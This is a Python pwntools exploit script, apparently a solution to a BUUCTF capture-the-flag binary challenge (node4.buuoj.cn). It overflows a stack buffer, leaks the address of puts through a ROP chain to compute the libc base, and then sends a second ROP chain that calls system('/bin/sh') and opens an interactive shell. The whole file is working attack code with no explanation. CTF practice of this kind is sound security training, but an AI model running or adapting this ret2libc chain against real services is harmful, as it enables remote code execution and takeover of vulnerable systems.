from pwn import *
from LibcSearcher import *
#context.log_level='debug'

sh=remote("node4.buuoj.cn",29664)
#sh=process("./timu")
elf=ELF("./timu")
libc=ELF("./libc-2.27.so")

puts_plt=p64(elf.plt["puts"])
puts_got=p64(elf.got["puts"])
main_addr=p64(0x0000000000400B28)
pop_rdi_ret=p64(0x0000000000400c83)
ret=p64(0x00000000004006b9)

sh.sendline(b'1')
sh.recv()
payload=0x58*b'a'+pop_rdi_ret+puts_got+puts_plt+main_addr
sh.sendline(payload)
sh.recvuntil(b"Ciphertext\n")
sh.recvuntil(b"\n")
puts_addr=u64(sh.recv(6).ljust(8,b"\x00"))
#print(puts_addr)

libc_base=puts_addr-libc.sym["puts"]
system_addr=libc_base+libc.sym["system"]
bin_sh=libc_base+next(libc.search(b"/bin/sh"))

#libc=LibcSearcher("puts",puts_addr)
#libc_base=puts_addr-libc.dump("puts")
print("libc_base =",libc_base)
#system_addr=libc_base+libc.dump("system")
#bin_sh=libc_base+libc.dump("str_bin_sh")

sh.sendline(b'1')
sh.recv()
payload=0x58*b'a'+ret+pop_rdi_ret+p64(bin_sh)+p64(system_addr)+p64(0xdeadbeef)
sh.sendline(payload)
sh.interactive()
